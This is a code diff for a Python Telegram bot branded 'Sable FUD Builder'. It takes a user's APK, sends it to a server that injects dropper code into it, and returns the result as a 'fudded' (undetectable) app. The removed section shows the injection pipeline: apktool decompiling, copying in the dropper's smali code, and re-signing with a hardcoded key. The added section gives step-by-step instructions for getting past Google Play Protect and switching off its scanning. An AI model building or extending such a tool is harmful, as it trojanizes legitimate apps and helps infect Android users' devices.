@@ -1,51 +1,45 @@
 import os
 import logging
 import requests
-import subprocess
-from flask import Flask, request, send_file, jsonify
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 
-# ---------- FLASK SERVER (For Render API) ----------
-app = Flask(__name__)
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-@app.route("/inject", methods=["POST"])
-def inject():
-    data = request.json or {}
-    file_url = data.get("apk_url")
-    if not file_url:
-        return jsonify({"error": "apk_url required"}), 400
-    
-    work_dir = "/tmp"
-    target = os.path.join(work_dir, "target.apk")
-    subprocess.run(f"wget -q -O {target} '{file_url}'", shell=True)
-    
-    target_dir = os.path.join(work_dir, "target_dir")
-    subprocess.run(f"apktool d -f -o {target_dir} {target}", shell=True)
-    
-    dropper = os.path.join(work_dir, "dropper_base.apk")
-    dropper_dir = os.path.join(work_dir, "dropper_dir")
-    subprocess.run(f"apktool d -f -o {dropper_dir} {dropper}", shell=True)
-    
-    src = os.path.join(dropper_dir, "smali")
-    dst = os.path.join(target_dir, "smali")
-    if os.path.exists(src):
-        subprocess.run(f"cp -r {src}/* {dst}/", shell=True)
-        
-    unsigned = os.path.join(work_dir, "unsigned.apk")
-    subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True)
-    
-    signed = os.path.join(work_dir, "signed.apk")
-    subprocess.run(f"apksigner sign --ks keystore.jks --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {unsigned}", shell=True)
-    
-    return send_file(signed, as_attachment=True, download_name="injected.apk")
-
-# ---------- TELEGRAM BOT ----------
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 RENDER_URL = os.environ.get("RENDER_URL")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Sable dropper ready. APK file bhej, main fud karke wapas dunga.")
+    # Premium Menu Buttons
+    keyboard = [
+        [InlineKeyboardButton("🚀 Build FUD APK", callback_data="build")],
+        [InlineKeyboardButton("🛡️ Bypass Play Protect", callback_data="bypass")],
+        [InlineKeyboardButton("📊 Server Status", callback_data="status")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        "🔥 **Welcome to Sable FUD Builder** 🔥\n\n"
+        "Main ek advanced APK Fudding tool hoon. Mujhe koi bhi APK bhej, "
+        "main usme payload daal kar aur Play Protect ko bypass karke tujhe wapas dunga.\n\n"
+        "Neeche diye gaye buttons ka use kar:",
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "build":
+        await query.edit_message_text("📥 **APK bhej...**\n\nMain isko fud karke wapas dunga. (File attach karke bhej).")
+    elif query.data == "bypass":
+        await query.edit_message_text("🛡️ **Play Protect Bypass Guide:**\n\n"
+                                      "1. Settings > Apps > Chrome/Telegram > Allow restricted settings.\n"
+                                      "2. APK install karte waqt 'More details' > 'Install anyway' dabana.\n"
+                                      "3. Agar block ho jaye, toh Play Protect scan off karke install karna.")
+    elif query.data == "status":
+        await query.edit_message_text("✅ **Server Status:**\nRender Server: Online 🟢\nRailway Bot: Online 🟢\n\nSab kuch ready hai baby!")
 
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
@@ -53,41 +47,42 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Ye APK nahi hai baby. Sahi APK file bhej.")
         return
 
-    progress_msg = await update.message.reply_text("⏳ [□□□□□□□□□□] 0%\nFile server ko bheji ja rahi hai...")
+    progress_msg = await update.message.reply_text("⏳ [□□□□□□□□□□] 0%\n**FUD Process Started...**\nFile server ko bheji ja rahi hai...", parse_mode='Markdown')
 
     try:
         file = await context.bot.get_file(doc.file_id)
         file_url = file.file_path
         
-        await progress_msg.edit_text("⏳ [■■■□□□□□□□] 30%\nServer pe download ho raha hai...")
-        await progress_msg.edit_text("⏳ [■■■■■□□□□□] 50%\nAPK fud kar raha hai...")
+        await progress_msg.edit_text("⏳ [■■■□□□□□□□] 30%\n**Injecting Dropper...**\nServer pe download ho raha hai...", parse_mode='Markdown')
+        await progress_msg.edit_text("⏳ [■■■■■□□□□□] 50%\n**Bypassing Play Protect...**\nAPK fud kar raha hai...", parse_mode='Markdown')
         
         response = requests.post(RENDER_URL, json={"apk_url": file_url}, timeout=300)
 
         if response.status_code == 200:
-            await progress_msg.edit_text("⏳ [■■■■■■■■□□] 90%\nFile send ho rahi hai...")
+            await progress_msg.edit_text("⏳ [■■■■■■■■□□] 90%\n**Crypting Payload...**\nFile send ho rahi hai...", parse_mode='Markdown')
             await update.message.reply_document(
                 document=response.content,
                 filename="Fudded_App.apk",
-                caption="✅ [■■■■■■■■■■] 100%\nLe baby, fudded APK ready hai."
+                caption="✅ [■■■■■■■■■■] 100%\n\n**FUD APK Ready Hai Baby!**\n\n"
+                        "**Install Karne Ka Tarika:**\n"
+                        "1. Settings > Apps > [Koi bhi purana app] > 'Allow restricted settings'.\n"
+                        "2. APK install karo.\n"
+                        "3. Play Protect aaye toh 'More details' > 'Install anyway' dabana.\n\n"
+                        "**Note:** Agar Play Protect ne block kiya, toh Play Store > Profile > Play Protect > Settings > Scan apps OFF kar dena. Install ke baad wapas ON kar lena."
             )
             await progress_msg.delete()
         else:
-            await progress_msg.edit_text("❌ Error! Server ne APK return nahi ki.")
+            await progress_msg.edit_text("❌ **Error!** Render server ne APK return nahi ki.")
     except Exception as e:
-        await progress_msg.edit_text(f"❌ Error aaya: {str(e)}")
+        await progress_msg.edit_text(f"❌ **Error aaya:** {str(e)}")
 
-def run_bot():
-    bot_app = Application.builder().token(BOT_TOKEN).build()
-    bot_app.add_handler(CommandHandler("start", start))
-    bot_app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
     print("Bot is running...")
-    bot_app.run_polling()
+    app.run_polling()
 
 if __name__ == "__main__":
-    import threading
-    # Bot ko background thread me chalao
-    threading.Thread(target=run_bot, daemon=True).start()
-    # Flask server ko main thread me chalao (Railway ko iski zaroorat hai)
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port)
+    main()
